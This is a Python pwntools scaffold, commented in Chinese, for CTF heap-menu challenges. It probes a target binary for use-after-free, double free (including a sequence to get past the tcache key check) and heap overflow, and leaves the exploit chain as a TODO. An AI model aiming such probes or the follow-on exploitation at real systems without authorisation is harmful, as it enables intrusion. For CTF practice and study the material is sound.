#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: 通用堆菜单题交互脚手架 —— add/delete/edit/show 统一分发封装,
     内置 UAF / double free 一键验证开关, 快速确认漏洞类型再选利用链
适用条件:
    - 一切菜单式堆题(glibc >= 2.26 tcache 时代为主), 题目有 编号-索引 交互
    - 先用本脚手架确认漏洞, 再接 pwn_tcache_poison.py / pwn_fsop_apple2.py 的利用链
用法:
    1) 改 CONFIG 区: HOST/PORT/BINARY/LIBC
    2) 改 Menu 类 4 个函数的选项号与提示符(按题目菜单)
    3) 命令行: python pwn_heap_menu.py --check uaf / --check df / --check of (或全跑)
"""
import sys
import argparse
from pwn import *

# ==================== CONFIG: TODO 改这里 ====================
BINARY = "./pwn"            # TODO: 改这里
LIBC_PATH = "./libc.so.6"   # TODO: 改这里, 没有则 None
HOST, PORT = "node.node3.com", 23333  # TODO: 改这里: 远程地址
LOCAL = False               # TODO: 改这里: True 走本地 process, False 走远程
# =============================================================

context.log_level = "info"
libc = ELF(LIBC_PATH, checksec=False) if LIBC_PATH else None


class Menu:
    """菜单交互分发封装: 所有题目差异都收敛在这 4 个函数里"""

    def __init__(self, io):
        self.io = io

    # TODO: 改这里: 以下选项号与提示符按题目菜单逐个对齐
    def add(self, size, content=b"a"):
        self.io.sendlineafter(b"choice:", b"1")
        self.io.sendlineafter(b"size:", str(size).encode())
        if content:
            self.io.sendlineafter(b"content:", content)

    def delete(self, idx):
        self.io.sendlineafter(b"choice:", b"2")
        self.io.sendlineafter(b"index:", str(idx).encode())

    def edit(self, idx, content):
        self.io.sendlineafter(b"choice:", b"3")
        self.io.sendlineafter(b"index:", str(idx).encode())
        self.io.sendlineafter(b"content:", content)

    def show(self, idx):
        self.io.sendlineafter(b"choice:", b"4")
        self.io.sendlineafter(b"index:", str(idx).encode())
        # TODO: 改这里: 按题目输出格式截取内容部分
        return self.io.recvline_contains(b"content:", timeout=2)


def start():
    if LOCAL:
        return process(BINARY)
    return remote(HOST, PORT)


def check_uaf():
    """UAF 检测: free 后仍 show, 若打印出堆/libc 指针残留 => 指针未清空"""
    io = start()
    m = Menu(io)
    m.add(0x68)          # idx 0: 小 chunk, free 后 fd 落在用户区
    m.delete(0)
    data = m.show(0)
    log.info(f"free 后 show(0) = {data}")
    if b"content:" in data and any(c in data for c in b"\x7f\x55\x56"):
        log.success("疑似 UAF: free 后内容仍可读(残留指针)")
    else:
        log.failure("无 UAF 迹象: 可能指针已置 NULL")
    io.close()


def check_double_free():
    """double free 检测: 同一 idx free 两次, 程序不崩 => tcache double free 可行
    (glibc >= 2.29 有 tcache key 检测, 需先 free 中间隔一个 chunk 再来)"""
    io = start()
    m = Menu(io)
    m.add(0x68)          # idx 0
    m.add(0x68)          # idx 1: 隔板
    m.delete(0)
    m.delete(1)
    m.delete(0)          # 绕 key 检测的经典三连
    try:
        m.show(0)
        log.success("double free 通过: free 两次未崩, 可做 tcache poisoning")
    except Exception:
        log.failure("double free 被拦(检测/崩溃)")
    io.close()


def check_overflow():
    """越界写探测: add 大小 0x18 却写 0x28 字节, 看下一 chunk 是否被改"""
    io = start()
    m = Menu(io)
    m.add(0x18)                      # idx 0
    m.add(0x18, b"B" * 8)            # idx 1: 内容作标记
    m.edit(0, b"A" * 0x28)           # 越界写 0x10 字节
    data = m.show(1)
    if b"AAAAAAAA" in data:
        log.success("疑似 off-by-null/越界写: 下一个 chunk 内容被覆盖")
    else:
        log.failure("无明显越界")
    io.close()


def pwn():
    """确认漏洞后, 把正式利用链写在这里(参考 tcache_poison / fsop_apple2 模板)"""
    io = start()
    m = Menu(io)
    # TODO: 改这里: 正式利用链
    io.interactive()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="堆菜单题脚手架")
    parser.add_argument("--check", choices=["uaf", "df", "of", "all"], default="all",
                        help="uaf=释放后可读 df=double free of=越界写 all=全跑")
    args = parser.parse_args()
    if args.check in ("uaf", "all"):
        check_uaf()
    if args.check in ("df", "all"):
        check_double_free()
    if args.check in ("of", "all"):
        check_overflow()
    if args.check == "all":
        pwn()
